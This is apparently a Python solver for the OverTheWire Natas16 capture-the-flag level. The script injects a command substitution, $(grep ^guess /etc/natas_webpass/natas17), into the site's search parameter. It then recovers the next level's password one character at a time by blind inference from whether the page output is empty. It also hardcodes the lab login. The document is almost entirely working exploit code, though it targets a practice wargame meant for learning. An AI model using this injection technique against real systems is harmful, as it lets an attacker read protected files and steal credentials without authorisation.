import requests, string
username = "natas16"
password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
 
possibleCharacters = list(string.ascii_letters + string.digits) #possible flag characters are letters and digits.
resultFlag = "" 
characterCounter = 0
while(len(resultFlag) < 32):

    
    current_challenge = resultFlag + possibleCharacters[characterCounter]

    #Idea for needle: If we are right with our current guess (pw begins with ^current_challenge), pw is returned. This means the outer grep will search for the pw in the dictionary and find nothing (empty response). If we are wrong, outer grep will search for "" in dictionary, dumping it out completely.
    needle = f"$(grep ^{current_challenge} /etc/natas_webpass/natas17)" 
    
    print("Testing: " + current_challenge)
    url = f"http://{username}:{password}@{username}.natas.labs.overthewire.org/?needle={needle}&submit=Search"
    resp = requests.get(url)
    #print(resp.text)
    if("Input contains an illegal character!" in resp.text):
        print("Illegal character: " + current_challenge)
        break
    if("<pre>" in resp.text):
        matches = resp.text.split("<pre>")[1]
        matches = matches.split("</pre>")[0].strip()
        
        if(not matches): #If there was NO output, this means our guess was correct because the outer grep searches for the pw in dictionary.txt and finds nothing
            print("match!")
            resultFlag = current_challenge
            characterCounter = 0
        else: #If there was output, our guess was wrong, the outer grep just dumps out the dictionary.txt
            characterCounter +=1 
            

print("Flag: " + resultFlag)
